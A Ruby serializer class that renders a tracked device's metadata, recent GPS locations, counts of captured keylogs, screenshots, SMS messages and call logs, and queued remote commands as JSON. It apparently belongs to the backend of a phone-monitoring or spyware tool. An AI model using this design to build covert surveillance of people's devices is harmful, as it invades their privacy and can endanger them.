class DeviceSerializer
  def initialize(device, options = {})
    @device = device
    @options = options
  end
  
  def as_json
    {
      id: @device.id,
      device_id: @device.device_id,
      name: @device.name,
      model: @device.model,
      manufacturer: @device.manufacturer,
      operating_system: @device.operating_system,
      os_version: @device.os_version,
      last_seen: @device.updated_at,
      created_at: @device.created_at,
      updated_at: @device.updated_at
    }.tap do |hash|
      hash[:recent_locations] = locations_json if include?(:recent_locations)
      hash[:statistics] = statistics_json if include?(:statistics)
      hash[:pending_commands] = pending_commands_json if include?(:pending_commands)
    end
  end
  
  private
  
  def include?(association)
    @options[:include]&.include?(association)
  end
  
  def locations_json
    return [] unless @device.respond_to?(:geo_locations)
    
    @device.geo_locations.order(created_at: :desc).limit(10).map do |location|
      {
        latitude: location.latitude,
        longitude: location.longitude,
        accuracy: location.accuracy,
        recorded_at: location.created_at
      }
    end
  end
  
  def statistics_json
    {
      total_locations: count_association(:geo_locations),
      total_screenshots: count_association(:screenshots),
      total_keylogs: count_association(:keylogs),
      total_sms: count_association(:sms_messages),
      total_calls: count_association(:call_logs),
      total_pending_commands: count_association(:pending_commands)
    }
  end
  
  def pending_commands_json
    return [] unless @device.respond_to?(:pending_commands)
    
    @device.pending_commands.where(status: 'pending').order(created_at: :desc).limit(5).map do |cmd|
      {
        id: cmd.id,
        command: cmd.command,
        status: cmd.status,
        request_id: cmd.request_id,
        created_at: cmd.created_at
      }
    end
  end
  
  def count_association(association)
    @device.respond_to?(association) ? @device.send(association).count : 0
  end
end
